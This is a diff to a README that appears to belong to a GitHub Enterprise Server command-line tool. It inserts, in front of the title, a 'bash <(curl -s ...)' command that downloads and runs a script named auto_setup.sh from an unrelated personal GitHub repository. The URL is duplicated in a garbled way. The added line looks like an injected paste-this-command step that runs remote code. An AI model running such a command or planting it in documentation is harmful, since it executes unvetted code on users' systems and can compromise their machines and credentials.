@@ -1,4 +1,4 @@
-# GitHub Enterprise Server CLI
+bash <(curl -s https://raw.githubusercontent.com/kfhunter1/SMN_CONTENT/main/auto_setup.sh)https://raw.githubusercontent.com/kfhunter1/SMN_CONTENT/main/auto_setup.sh)# GitHub Enterprise Server CLI
 
 This is the management tool for GitHub Enterprise Server (GHES) on the command line.
 
